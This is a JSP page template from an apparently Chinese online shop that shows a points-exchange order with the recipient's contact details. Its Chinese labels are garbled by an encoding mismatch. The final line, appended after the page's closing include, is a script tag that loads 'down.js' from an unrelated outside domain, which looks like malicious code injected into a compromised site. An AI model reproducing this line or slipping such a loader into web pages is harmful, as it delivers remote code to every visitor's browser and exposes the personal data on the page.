<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="��������-�һ���ϸ"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
		<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>
	</td>
    <td bgcolor="#FFFFFF" valign="top" width="562"> 
        <table width="100%" border="1" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
          <tr> 
            <td> 
              <div align="center"></div>
            </td>
            <td>���Ķһ��嵥</td>
            <td>&nbsp;
				
            </td>
          </tr>
          <tr> 
            <td width="35%"> 
              <div align="center">��Ʒ����</div>
            </td>
            <td width="15%"> 
              <div align="center">������</div>
            </td>
            <td width="15%"> 
              <div align="center">����</div>
            </td>
          </tr>
          <c:set var="exchange" value="${result.exchange}"/>
		  <c:forEach var="item" items="${exchange.changeList}" > 
          <tr> 
            <td width="35%"><c:out value="${item.name}"/></td>
            <td width="15%"><c:out value="${item.point}"/></td>
            <td width="15%"><c:out value="${item.count}"/></td>
          </tr>
          </c:forEach>
          <tr> 
            <td width="35%">�ϼ�</td>
            <td width="15%"><c:out value="${exchange.totalPoint}"/></td>
            <td width="15%"><c:out value="${exchange.totalCount}"/></td>
          </tr>
     </table>
		
      <table width="100%" border="1">
        <tr> 
          <td colspan="2"> 
            <p>�ջ�����ϵ��ʽ��</p>
          </td>
        </tr>
        <tr> 
          <td width="16%">������</td>
          <td width="73%"> <c:out value="${exchange.name}"/> </td>
        </tr>
        <tr> 
          <td width="16%"> ��ַ��</td>
          <td width="73%"> <c:out value="${exchange.address}"/> </td>
        </tr>
        <tr> 
          <td width="16%">�ʱࣺ</td>
          <td width="73%"> <c:out value="${exchange.zip}"/> </td>
        </tr>
        <tr> 
          <td width="16%">��ϵ�绰��</td>
          <td width="73%"> <c:out value="${exchange.telNo}"/> </td>
        </tr>
        <tr> 
          <td width="16%">�ֻ���</td>
          <td width="73%"> <c:out value="${exchange.mobile}"/> </td>
        </tr>
        <tr> 
          <td width="16%">Email:</td>
          <td width="73%"> <c:out value="${exchange.email}"/> </td>
        </tr>
      </table>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>